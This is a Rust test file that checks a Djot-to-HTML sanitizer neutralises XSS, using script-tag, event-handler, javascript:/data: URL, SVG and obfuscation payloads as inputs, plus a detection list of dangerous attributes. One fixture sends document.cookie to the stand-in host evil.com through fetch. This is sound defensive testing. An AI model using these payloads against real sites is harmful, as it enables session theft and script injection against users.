//! XSS and Content Injection Security Tests
//!
//! These tests verify that user-generated content is properly sanitized to
//! prevent XSS attacks, script injection, and other security vulnerabilities.

use super::render_sanitized;

/// Assert that dangerous content is not present in the output as executable
/// HTML. Note: Content may appear as escaped text (e.g., &lt;script&gt;) which
/// is safe.
fn assert_no_dangerous_content(html: &str, test_name: &str) {
    // Script tags (unescaped) - check that <script is NOT present
    // but &lt;script (escaped) is OK
    assert!(
        !html.contains("<script") && !html.contains("<SCRIPT") && !html.contains("<Script"),
        "{test_name}: Should not contain unescaped <script> tags"
    );

    // For event handlers and dangerous URLs, we need to check if they appear
    // inside actual HTML tags, not inside escaped text.
    // Strategy: Find all actual HTML tags (< ... >) and check their content.
    let dangerous_in_tags = has_dangerous_attributes(html);
    assert!(
        !dangerous_in_tags,
        "{test_name}: Should not contain dangerous attributes in HTML tags"
    );
}

/// Check if any actual HTML tags contain dangerous attributes.
/// This ignores escaped content like &lt;div onclick="..."&gt;
fn has_dangerous_attributes(html: &str) -> bool {
    // Regex-free approach: find actual tags and check their contents
    let mut in_tag = false;
    let mut tag_content = String::new();
    let mut chars = html.chars().peekable();

    while let Some(c) = chars.next() {
        if c == '<' && chars.peek() != Some(&'!') {
            // Check it's not an HTML entity like &lt;
            // Actually, we're iterating over the raw HTML, so < is a real tag start
            in_tag = true;
            tag_content.clear();
        } else if c == '>' && in_tag {
            in_tag = false;
            // Check tag_content for dangerous attributes
            let tag_lower = tag_content.to_lowercase();

            // Event handlers
            let event_handlers = [
                "onclick",
                "onerror",
                "onload",
                "onmouseover",
                "onfocus",
                "onblur",
                "onchange",
                "onsubmit",
                "onkeydown",
                "onkeyup",
                "onkeypress",
                "onmousedown",
                "onmouseup",
                "onmousemove",
                "onmouseout",
                "onmouseenter",
                "onmouseleave",
                "ondblclick",
                "oncontextmenu",
                "onwheel",
                "ondrag",
                "ondrop",
                "oncopy",
                "oncut",
                "onpaste",
                "onscroll",
                "ontouchstart",
                "ontouchend",
                "ontouchmove",
                "onanimationend",
                "ontransitionend",
            ];
            for handler in event_handlers {
                if tag_lower.contains(&format!("{handler}="))
                    || tag_lower.contains(&format!(" {handler} "))
                {
                    return true;
                }
            }

            // javascript: URLs
            if tag_lower.contains("javascript:") {
                return true;
            }

            // data:text/html URLs
            if tag_lower.contains("data:text/html") {
                return true;
            }

            // vbscript: URLs
            if tag_lower.contains("vbscript:") {
                return true;
            }

            tag_content.clear();
        } else if in_tag {
            tag_content.push(c);
        }
    }

    false
}

// --- Script Tag Injection Tests ---

#[tokio::test]
async fn xss_script_tag_inline() {
    let content = r#"<script>alert('xss')</script>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "script_tag_inline");
}

#[tokio::test]
async fn xss_script_tag_with_src() {
    let content = r#"<script src="https://evil.com/xss.js"></script>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "script_tag_src");
}

#[tokio::test]
async fn xss_script_tag_multiline() {
    let content = r#"<script>
        document.cookie;
        fetch('https://evil.com/steal?c=' + document.cookie);
    </script>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "script_tag_multiline");
}

#[tokio::test]
async fn xss_script_tag_uppercase() {
    let content = r#"<SCRIPT>alert('xss')</SCRIPT>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "script_tag_uppercase");
}

#[tokio::test]
async fn xss_script_tag_mixed_case() {
    let content = r#"<ScRiPt>alert('xss')</sCrIpT>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "script_tag_mixed_case");
}

// --- Event Handler Injection Tests ---

#[tokio::test]
async fn xss_onclick_attribute() {
    let content = r#"<div onclick="alert('xss')">click me</div>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "onclick_attribute");
}

#[tokio::test]
async fn xss_onerror_in_img() {
    let content = r#"<img src="x" onerror="alert('xss')">"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "onerror_img");
}

#[tokio::test]
async fn xss_onload_in_img() {
    let content = r#"<img src="valid.jpg" onload="alert('xss')">"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "onload_img");
}

#[tokio::test]
async fn xss_onload_in_body() {
    let content = r#"<body onload="alert('xss')">content</body>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "onload_body");
}

#[tokio::test]
async fn xss_onfocus_autofocus() {
    let content = r#"<input onfocus="alert('xss')" autofocus>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "onfocus_autofocus");
}

#[tokio::test]
async fn xss_onmouseover() {
    let content = r#"<a onmouseover="alert('xss')">hover me</a>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "onmouseover");
}

// --- JavaScript URL Injection Tests ---

#[tokio::test]
async fn xss_javascript_url_in_href() {
    let content = r#"<a href="javascript:alert('xss')">click</a>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "javascript_url_href");
}

#[tokio::test]
async fn xss_javascript_url_with_entities() {
    let content = r#"<a href="java&#115;cript:alert('xss')">click</a>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "javascript_url_entities");
}

#[tokio::test]
async fn xss_javascript_url_with_whitespace() {
    let content = r#"<a href="   javascript:alert('xss')">click</a>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "javascript_url_whitespace");
}

#[tokio::test]
async fn xss_javascript_url_with_newline() {
    let content = "<a href=\"java\nscript:alert('xss')\">click</a>";
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "javascript_url_newline");
}

// --- Data URL Injection Tests ---

#[tokio::test]
async fn xss_data_url_html() {
    let content = r#"<a href="data:text/html,<script>alert('xss')</script>">click</a>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "data_url_html");
}

#[tokio::test]
async fn xss_data_url_base64() {
    let content =
        r#"<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">click</a>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "data_url_base64");
}

#[tokio::test]
async fn xss_data_url_in_iframe() {
    let content = r#"<iframe src="data:text/html,<script>alert('xss')</script>"></iframe>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "data_url_iframe");
    assert!(
        !html.to_lowercase().contains("<iframe"),
        "Should not contain iframe"
    );
}

// --- SVG-based XSS Tests ---

#[tokio::test]
async fn xss_svg_with_script() {
    let content = r#"<svg><script>alert('xss')</script></svg>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "svg_script");
}

#[tokio::test]
async fn xss_svg_onload() {
    let content = r#"<svg onload="alert('xss')"></svg>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "svg_onload");
}

#[tokio::test]
async fn xss_svg_use_xlink() {
    let content =
        r#"<svg><use xlink:href="data:image/svg+xml,<svg onload=alert('xss')>"></use></svg>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "svg_use_xlink");
}

// --- Dangerous HTML Elements Tests ---

#[tokio::test]
async fn xss_iframe_injection() {
    let content = r#"<iframe src="https://evil.com"></iframe>"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.to_lowercase().contains("<iframe"),
        "iframe_injection: Should not contain iframe"
    );
}

#[tokio::test]
async fn xss_object_injection() {
    let content = r#"<object data="https://evil.com/flash.swf"></object>"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.to_lowercase().contains("<object"),
        "object_injection: Should not contain object"
    );
}

#[tokio::test]
async fn xss_embed_injection() {
    let content = r#"<embed src="https://evil.com/flash.swf">"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.to_lowercase().contains("<embed"),
        "embed_injection: Should not contain embed"
    );
}

#[tokio::test]
async fn xss_form_injection() {
    let content = r#"<form action="https://evil.com/steal"><input name="password"></form>"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.to_lowercase().contains("<form"),
        "form_injection: Should not contain form"
    );
}

#[tokio::test]
async fn xss_meta_refresh() {
    let content = r#"<meta http-equiv="refresh" content="0;url=https://evil.com">"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.to_lowercase().contains("<meta"),
        "meta_refresh: Should not contain meta"
    );
}

#[tokio::test]
async fn xss_base_tag() {
    let content = r#"<base href="https://evil.com/">"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.to_lowercase().contains("<base"),
        "base_tag: Should not contain base"
    );
}

#[tokio::test]
async fn xss_link_stylesheet() {
    let content = r#"<link rel="stylesheet" href="https://evil.com/evil.css">"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.to_lowercase().contains("<link"),
        "link_stylesheet: Should not contain link"
    );
}

// --- Style/CSS Injection Tests ---

#[tokio::test]
async fn xss_style_tag() {
    let content = r#"<style>body { background: url('javascript:alert(1)'); }</style>"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.to_lowercase().contains("<style"),
        "style_tag: Should not contain style tag"
    );
}

#[tokio::test]
async fn xss_style_attribute() {
    let content = r#"<div style="background: url('javascript:alert(1)')">text</div>"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.contains("<div"),
        "style_attribute: Raw HTML should be escaped"
    );
}

#[tokio::test]
async fn xss_style_expression() {
    let content = r#"<div style="width: expression(alert('xss'))">text</div>"#;
    let html = render_sanitized(content).await;
    assert!(
        !html.contains("<div"),
        "style_expression: Raw HTML should be escaped"
    );
}

// --- Attribute Injection/Breaking Tests ---

#[tokio::test]
async fn xss_attribute_breaking_double_quote() {
    let content = r#"<img src="x" title=""><script>alert('xss')</script><a b="">"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "attribute_breaking_double");
}

#[tokio::test]
async fn xss_attribute_breaking_single_quote() {
    let content = r#"<img src='x' title=''><script>alert('xss')</script><a b=''>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "attribute_breaking_single");
}

// --- Djot-specific Tests ---

#[tokio::test]
async fn xss_djot_raw_html_block() {
    let content = "```{=html}\n<script>alert('xss')</script>\n```";
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "djot_raw_html_block");
}

#[tokio::test]
async fn xss_djot_raw_inline() {
    let content = "`<script>alert('xss')</script>`{=html}";
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "djot_raw_inline");
}

// --- Encoding/Obfuscation Tests ---

#[tokio::test]
async fn xss_html_entities_script() {
    let content = "&lt;script&gt;alert('xss')&lt;/script&gt;";
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "html_entities_script");
}

#[tokio::test]
async fn xss_unicode_escapes() {
    let content = r#"<img src="x" \u006Fnload="alert('xss')">"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "unicode_escapes");
}

#[tokio::test]
async fn xss_null_byte_injection() {
    let content = "<scr\x00ipt>alert('xss')</script>";
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "null_byte_injection");
}

// --- Nested/Combined Attack Tests ---

#[tokio::test]
async fn xss_nested_tags() {
    let content = r#"<<script>script>alert('xss')</</script>script>"#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "nested_tags");
}

#[tokio::test]
async fn xss_comment_breaking() {
    let content = "<!--<script>alert('xss')</script>-->";
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "comment_breaking");
}

#[tokio::test]
async fn xss_complex_attack() {
    let content = r#"
        <div onclick="alert(1)">
            <script>alert(2)</script>
            <img src="x" onerror="alert(3)">
            <a href="javascript:alert(4)">link</a>
            <svg onload="alert(5)"></svg>
            <iframe src="javascript:alert(6)"></iframe>
        </div>
    "#;
    let html = render_sanitized(content).await;
    assert_no_dangerous_content(&html, "complex_attack");
    assert!(
        !html.to_lowercase().contains("<iframe"),
        "complex_attack: Should not contain iframe"
    );
    assert!(
        !html.to_lowercase().contains("<svg"),
        "complex_attack: Should not contain svg"
    );
}

// --- Safe Content Tests (ensure we don't over-sanitize) ---

#[tokio::test]
async fn safe_content_basic_text() {
    let content = "Hello, this is normal text.";
    let html = render_sanitized(content).await;
    assert!(html.contains("Hello, this is normal text."));
}

#[tokio::test]
async fn safe_content_basic_formatting() {
    let content = "This is *bold* and _italic_ text.";
    let html = render_sanitized(content).await;
    assert!(html.contains("<strong>") || html.contains("<em>"));
}

#[tokio::test]
async fn safe_content_links() {
    let content = "[safe link](https://example.com)";
    let html = render_sanitized(content).await;
    assert!(html.contains("href=\"https://example.com\""));
    assert!(html.contains("safe link"));
}

#[tokio::test]
async fn safe_content_code_block() {
    let content = "```javascript\nconst x = 1;\nalert(x);\n```";
    let html = render_sanitized(content).await;
    assert!(html.contains("const x = 1;"));
    assert!(html.contains("alert(x);"));
    assert!(html.contains("<code"));
    assert_no_dangerous_content(&html, "safe_code_block");
}

#[tokio::test]
async fn safe_content_inline_code() {
    let content = "Use `<script>` tags for JavaScript.";
    let html = render_sanitized(content).await;
    assert!(html.contains("<code>"));
    assert!(
        html.contains("&lt;script&gt;") || !html.contains("<script>"),
        "Inline code with script should be escaped"
    );
}

#[tokio::test]
async fn safe_content_mentions_script_in_text() {
    let content = "The word javascript and script and onclick should be fine in plain text.";
    let html = render_sanitized(content).await;
    assert!(html.contains("javascript"));
    assert!(html.contains("onclick"));
}
